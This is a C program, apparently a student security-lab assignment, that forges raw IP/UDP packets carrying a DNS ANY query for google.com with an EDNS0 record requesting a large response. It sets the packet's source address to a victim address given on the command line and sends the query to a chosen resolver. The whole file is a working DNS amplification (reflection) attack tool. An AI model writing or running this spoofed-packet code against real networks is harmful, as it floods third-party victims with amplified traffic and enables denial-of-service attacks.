#include "dns_attack.h"

int main(int argc, char* argv[])
{

    unsigned char dns_data[128];
    struct DNS_HEADER *dns = (struct DNS_HEADER*)dns_data;
    dns->id = (unsigned short) htons(0xED08); // Student ID: 0716040
    dns->flags = htons(0x0100);
    dns->q_count = htons(1);
    dns->ans_count = 0;
    dns->auth_count = 0;
    dns->add_count = htons(1);
	
    unsigned char *dns_name = (unsigned char *)(dns_data + sizeof(struct DNS_HEADER));
    DNS_format(dns_name, "google.com");

    struct query *q = (struct query *)(dns_data + sizeof(struct DNS_HEADER) + (strlen(dns_name)+1));
    q->qtype = htons(0x00ff);
    q->qclass = htons(0x1);

    char * edns = (char *)(dns_data + sizeof(struct DNS_HEADER) + (strlen(dns_name)+1) + sizeof(struct query) + 1);
    memset(edns    , 0x00, 1);
    memset(edns + 1, 0x29, 1);
    memset(edns + 2, 0xFF, 2);
    memset(edns + 4, 0x00, 7);

    char buffer[512];
    memset(buffer, 0, 512);
    memcpy(buffer + sizeof(struct iphdr) + sizeof(struct udphdr), &dns_data, sizeof(struct DNS_HEADER) + (strlen(dns_name)+1) + sizeof(struct query) + 12);

    struct iphdr *ip = (struct iphdr*)buffer;
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(atoi(argv[2]));
    addr.sin_addr.s_addr = inet_addr(argv[3]); 

    ip->ihl = 5;
    ip->version = 4;
    ip->tos = 0;
    ip->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct DNS_HEADER) + (strlen(dns_name)+1) + sizeof(struct query) + 12;
    ip->id = htons(getpid());
    ip->frag_off = 0;
    ip->ttl = 64;
    ip->protocol = IPPROTO_UDP;
    ip->check = 0;
    ip->saddr = inet_addr(argv[1]);
    ip->daddr = addr.sin_addr.s_addr;
    ip->check = csum((unsigned short*)buffer, ip->tot_len);

    struct udphdr* udp = (struct udphdr*)(buffer + sizeof(struct iphdr));
    udp->source = htons(atoi(argv[2]));
    udp->dest = htons(53);
    udp->len = htons(8 + sizeof(struct DNS_HEADER) + (strlen(dns_name)+1) + sizeof(struct query) + 12);
    udp->check = 0;

    struct PSEUDO_HEADER p;
    p.source_address = inet_addr(argv[1]);
	p.dest_address = addr.sin_addr.s_addr;
	p.placeholder = 0;
	p.protocol = IPPROTO_UDP;
	p.udp_length = htons(sizeof(struct udphdr) + sizeof(struct DNS_HEADER) + (strlen(dns_name)+1) + sizeof(struct query) + 12);
    int psize = sizeof(struct PSEUDO_HEADER) + sizeof(struct udphdr) + sizeof(struct DNS_HEADER) + (strlen(dns_name)+1) + sizeof(struct query) + 12;
	char* pseudogram = malloc(psize);
	memcpy(pseudogram , (char*) &p , sizeof (struct PSEUDO_HEADER));
	memcpy(pseudogram + sizeof(struct PSEUDO_HEADER), udp, sizeof(struct udphdr) + sizeof(struct DNS_HEADER) + (strlen(dns_name)+1) + sizeof(struct query) + 12);
	udp -> check = csum((unsigned short*) pseudogram, psize);

    int sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    for(int i=0;i<3;i++)
    {
        if(sendto(sd, buffer, ip->tot_len, 0, (struct sockaddr*)&addr, sizeof(addr))<0) 
            perror("sendto failed");
        //Data sent successfully
        else
            printf ("Packet Send. Length : %d \n" , ip->tot_len);
    }
    close(sd);
    
}
